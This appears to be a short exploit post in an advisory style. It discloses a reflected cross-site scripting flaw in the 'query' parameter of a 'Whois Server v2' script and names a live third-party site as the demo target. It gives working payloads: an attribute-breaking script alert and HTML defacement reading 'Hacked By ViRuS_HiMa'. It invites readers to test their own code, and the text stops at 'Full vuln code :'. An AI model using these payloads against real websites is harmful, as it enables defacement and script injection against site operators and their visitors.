Whois Server v2 XSS
===================



    Vuln in :
    
    "?query="
 
    cuz when you Search about an domain in the script form
 
    you gonna find the typed text Clear ! no encryptiation!
 
     so we can use it as xss vuln :p
 
     here we got A live demo on no-ip.com official site :)
 
    http://whois.no-ip.com
 
    type any domain e.g inj3ct0r.com and we got some thing like this :
 
    "Whois Server Version 2.0 No match for domain "inj3ct0r.com . . . etc"
 
    but what if we typed an xss code in the search form ? :
 
    "><font+size=55+color=red>Hacked By+ViRuS_HiMa</font><script>alert(/ViRuS_HiMa/)</script>
 
    or simple html code like : <html><h1>Hacked By ViRuS_HiMa</h1></html>
 
    the result for the first code is alert msg say : /ViRuS_HiMa/
 
 
    "Whois Server Version 2.0
 
    No match for domain "\">hacked by virus_hima"
 
    thats all and you can test your codes :)   
 
    Full vuln code :
